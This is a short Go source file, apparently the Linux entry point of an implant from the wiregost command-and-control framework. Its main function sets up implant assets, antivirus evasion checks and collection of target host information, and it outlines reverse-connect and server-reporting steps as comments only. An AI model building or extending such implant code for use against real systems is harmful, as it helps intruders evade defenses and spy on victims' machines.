package linux

import (
	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/core/generic/channels"
	"github.com/maxlandon/wiregost/ghost/core/generic/evasion"
	"github.com/maxlandon/wiregost/ghost/core/generic/info"
	"github.com/maxlandon/wiregost/ghost/log"
)

func main() {

	// Gather and check all compile-time variables/configuration
	assets.SetupImplantAssets()

	// Init logging
	log.SetupLogging()

	// Multithreading
	channels.SetupChannels()

	// Security -------------------------------------------------------------

	// Various Security checks (antivirus software running, etc)
	evasion.SetupSecurity()

	// Check/set limits

	// Information ----------------------------------------------------------

	// Ghost info, networks available, users connected, env variables
	// Permissions, Owner, OS details, OS specific information.
	info.LoadTargetInformation()

	// Communications & Routing ---------------------------------------------

	// Set network security & credentials

	// Reverse connect or bind listener (goroutine, + send information)

	// Register RPC services if listener

	// Open routes given by server

	// Other ----------------------------------------------------------------

	// Monitor performance and resource usage, profiling.
	// Send reports to server every once in while. (blocking)
}
